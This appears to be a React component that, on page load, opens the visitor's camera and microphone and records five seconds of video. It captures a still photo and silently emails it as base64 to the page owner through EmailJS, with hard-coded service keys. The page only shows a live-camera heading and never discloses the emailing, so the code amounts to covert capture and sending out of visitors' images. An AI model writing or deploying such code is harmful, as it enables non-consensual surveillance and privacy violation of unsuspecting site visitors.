import React, { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const CameraCapture = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const recordedVideoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const [recordedChunks, setRecordedChunks] = useState([]);

  useEffect(() => {
    const sent = sessionStorage.getItem("photoSent");
    if (sent) return;

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then((stream) => {
        videoRef.current.srcObject = stream;
        videoRef.current.play();

        // Mulai rekam video
        mediaRecorderRef.current = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorderRef.current.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorderRef.current.onstop = () => {
          const blob = new Blob(chunks, { type: "video/webm" });
          const videoURL = URL.createObjectURL(blob);
          recordedVideoRef.current.src = videoURL;
          recordedVideoRef.current.controls = true;

          // Unduh otomatis
          const a = document.createElement("a");
          a.href = videoURL;
          a.download = "rekaman-pengunjung.webm";
          a.click();
        };

        mediaRecorderRef.current.start();

        setTimeout(() => {
          // Hentikan rekaman
          mediaRecorderRef.current.stop();

          // Ambil foto
          const canvas = canvasRef.current;
          const context = canvas.getContext("2d");
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
          const base64Image = canvas.toDataURL("image/jpeg");

          stream.getTracks().forEach((track) => track.stop());

          // Kirim foto ke email
          emailjs.send(
            "service_owekil9",
            "template_cpvwstn",
            {
              user_email: "anonymous@visitor.com",
              message: `📸 Foto pengunjung:\n${base64Image}`,
            },
            "mSJCO_NsfdQ76e3Nn"
          ).then(() => {
            console.log("📤 Foto dikirim!");
            sessionStorage.setItem("photoSent", "true");
          }).catch((error) => {
            console.error("❌ Gagal kirim:", error);
          });

        }, 5000);

      }).catch((err) => {
        console.error("❌ Kamera ditolak:", err);
      });
  }, []);

  return (
    <div>
      <h2>Kamera Live & Rekaman</h2>
      <video ref={videoRef} width="480" height="360" autoPlay muted />
      <canvas ref={canvasRef} style={{ display: "none" }} />
      <h3>📼 Rekaman</h3>
      <video ref={recordedVideoRef} width="480" height="360" />
    </div>
  );
};

export default CameraCapture;
